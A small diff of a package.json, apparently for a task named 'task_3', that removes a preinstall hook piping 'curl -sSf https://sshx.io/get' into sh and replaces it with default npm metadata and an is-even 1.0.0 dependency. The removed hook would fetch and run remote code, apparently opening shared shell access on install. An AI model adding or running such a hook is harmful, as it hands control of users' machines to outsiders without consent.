@@ -1,8 +1,14 @@
 {
-  "dependencies": {
-    "is-even": "0.1.2"
-  },
+  "name": "task_3",
+  "version": "1.0.0",
+  "main": "index.js",
   "scripts": {
-    "preinstall": "curl -sSf https://sshx.io/get | sh -s run"
+    "test": "echo \"Error: no test specified\" && exit 1"
+  },
+  "author": "",
+  "license": "ISC",
+  "description": "",
+  "dependencies": {
+    "is-even": "1.0.0"
   }
 }
